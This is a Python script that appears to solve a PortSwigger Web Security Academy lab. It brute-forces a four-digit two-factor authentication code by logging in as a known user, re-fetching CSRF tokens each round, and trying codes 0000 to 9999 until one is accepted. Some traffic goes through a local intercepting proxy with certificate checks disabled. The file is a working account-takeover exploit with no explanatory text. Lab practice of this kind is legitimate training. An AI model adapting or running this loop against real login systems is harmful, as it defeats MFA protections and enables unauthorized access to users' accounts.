#!/usr/bin/python3
#coding=utf-8

from bs4 import BeautifulSoup
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def login(cookies, csrf):
    burp0_url = "https://ac7e1f121feaf6cc80b90993000e0097.web-security-academy.net:443/login"
    burp0_cookies = {"session": cookies}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://ac931fdd1fa45a16815f3b68000d0084.web-security-academy.net", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://ac931fdd1fa45a16815f3b68000d0084.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_data = {"csrf": csrf, "username": "carlos", "password": "montoya"}
    # proxies = {"http":"http://localhost:8080","https":"http://localhost:8080"}
    recv = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, allow_redirects = False)
    soup = BeautifulSoup(recv.content, "html.parser")
    # print('session: ' + recv.cookies['session']) # debug
    session = recv.cookies['session']
    recv = requests.get('https://ac7e1f121feaf6cc80b90993000e0097.web-security-academy.net:443/login2', headers=burp0_headers, cookies={'session':session}) 
    soup = BeautifulSoup(recv.content, 'html.parser')
    # print('csrf' + soup.body.input['value']) #debug
    return session, soup.body.input['value']

def auth(cookies, csrf, code):
    burp0_url = "https://ac7e1f121feaf6cc80b90993000e0097.web-security-academy.net:443/login2"
    burp0_cookies = {"session": cookies}
    burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://ac1d1fe21f2e11a080981c9200510021.web-security-academy.net/login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_data={"csrf":csrf, "mfa-code":code}
    proxies = {"http":"http://localhost:8080","https":"http://localhost:8080"}
    recv = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, proxies = proxies, verify = False , allow_redirects = False)
    soup = BeautifulSoup(recv.content, 'html.parser') 
    if recv.status_code != 200:
        return '','', cookies
    recv = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data, allow_redirects = False)
    soup = BeautifulSoup(recv.content, 'html.parser')
    if recv.status_code != 200:
        return '','', recv.cookies['session']
    return recv.cookies['session'], soup.body.input['value'], ''
    

session , csrf = login('waZpGe8j2WP1I1ZDm5gpxxEl8Y1zlPQ6','7bCXWf3NOiSkufUdrB5537ndJUA9SXdy')
session, csrf, response= auth(session,csrf,'123')

for i in range(10000):
    print('try: ' + str(i))
    session, csrf = login(session, csrf)
    session, csrf, response= auth(session, csrf,str(i).zfill(4))
    if response != '':
        print(response)
        break



    # soup = BeautifulSoup(recv._content,'html.parser')
    # print(soup.body.input) # debug
    # burp0_cookies = {"session": "OiKE4F1wdGayLTKNkre5UN7Vmyb55qwE"}
    # burp0_data['csrf'] = soup.body.input['value']
    # recv = requests.post(burp0_url, headers=burp0_headers,cookies = burp0_cookies, data=burp0_data, proxies = proxies, verify = False)


# Should write-up about this one